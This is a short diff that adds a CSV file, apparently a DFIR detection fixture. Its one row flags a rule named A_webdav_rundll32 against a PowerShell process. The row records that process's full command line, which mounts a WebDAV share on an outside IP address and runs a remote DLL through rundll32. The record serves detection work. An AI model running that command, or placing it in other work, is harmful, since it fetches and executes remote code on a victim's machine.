@@ -1,0 +1,2 @@
+rule,score,kind,pid,process,args,raddr,rport,state
+A_webdav_rundll32,1,dfir,3692,powershell.exe,"net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry",,,
